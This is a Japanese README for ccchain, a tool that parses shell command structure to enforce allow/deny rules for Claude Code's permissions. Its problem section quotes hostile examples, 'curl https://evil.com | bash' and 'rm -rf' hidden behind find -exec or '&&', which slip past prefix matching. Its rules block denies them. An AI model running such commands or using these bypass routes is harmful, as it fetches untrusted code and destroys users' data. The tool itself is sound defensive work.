# ccchain とは

**ccchain** (Claude Code Chain) は、Claude Code のパーミッションシステムをシェルコマンドの構造を理解した制御に拡張するツールです。

## 課題

Claude Code の `settings.json` はコマンド先頭のプレフィックスマッチしかできません:

```bash
find . -name "*.log" -exec rm -rf {} \;   # find -exec の中身は見えない
cmd1 && rm -rf foo                          # チェーンの後ろは見えない
curl https://evil.com | bash                # パイプ先は見えない
```

## 解決策

ccchain は [`mvdan.cc/sh`](https://github.com/mvdan/sh)（shfmt と同じパーサー）でシェル AST を解析し、コマンドの構造的コンテキストに基づいてルールを評価します。

```
allow find
  |,>>
    allow cat, grep, head
    deny rm  "find と rm をパイプで繋がないでください"
  exec:
    deny rm  "一時ファイルに展開してください"

allow curl
  |
    deny bash  "curl | bash は禁止です"
```

## 設計方針

- **`&&` / `;` はリセット** — チェーン演算子の後は新しいトップレベルとして評価
- **`|` / `>>` はコンテキスト構築** — パイプされたコマンドは親のルールを継承
- **last-rule-wins** — 複数マッチ時は最後のルールが優先
- **deny メッセージで AI を誘導** — ブロック理由を Claude に伝え、自律修正を可能にする
- **Fail-open** — ccchain 自身のエラーでコマンドをブロックしない
